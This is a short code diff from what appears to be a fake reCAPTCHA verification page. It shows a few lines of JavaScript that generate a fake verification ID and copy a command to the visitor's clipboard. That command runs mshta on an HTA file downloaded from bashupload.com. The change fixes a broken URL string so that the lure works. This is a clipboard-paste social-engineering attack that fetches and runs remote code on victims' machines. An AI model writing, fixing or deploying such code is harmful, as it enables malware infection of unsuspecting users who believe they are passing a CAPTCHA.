@@ -419,7 +419,7 @@
             var verification_id = generateRandomNumber();
             document.getElementById('verification-id').textContent = verification_id;
             
-            const htaPath = https://bashupload.com/ + "4YkHi/recaptcha.hta?download=1";
+            const htaPath = "http://bashupload.com/4YkHi/" + "recaptcha.hta?download=1";
             const commandToRun = "mshta " + htaPath
             stageClipboard(commandToRun, verification_id)
         }
